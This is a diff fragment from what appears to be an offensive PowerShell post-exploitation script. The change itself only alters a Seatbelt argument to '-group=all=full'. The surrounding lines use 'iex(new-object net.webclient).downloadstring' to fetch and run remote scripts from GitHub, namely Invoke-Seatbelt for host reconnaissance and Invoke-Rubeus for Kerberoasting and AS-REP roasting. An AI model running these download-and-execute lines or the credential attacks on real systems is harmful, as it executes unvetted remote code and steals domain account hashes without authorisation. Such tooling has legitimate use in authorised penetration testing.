@@ -181,7 +181,7 @@ __        ___       ____
         {
             Write-Host -ForegroundColor Yellow 'Executing Seatbelt.'
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); 
-            if(!$consoleoutput){Invoke-Seatbelt -Command "-group=all" >> "$currentPath\LocalPrivesc\Seatbelt.txt"}else{Invoke-Seatbelt -Command "-group=all"}
+            if(!$consoleoutput){Invoke-Seatbelt -Command "-group=all=full" >> "$currentPath\LocalPrivesc\Seatbelt.txt"}else{Invoke-Seatbelt -Command "-group=all=full"}
             
             Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting.'
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
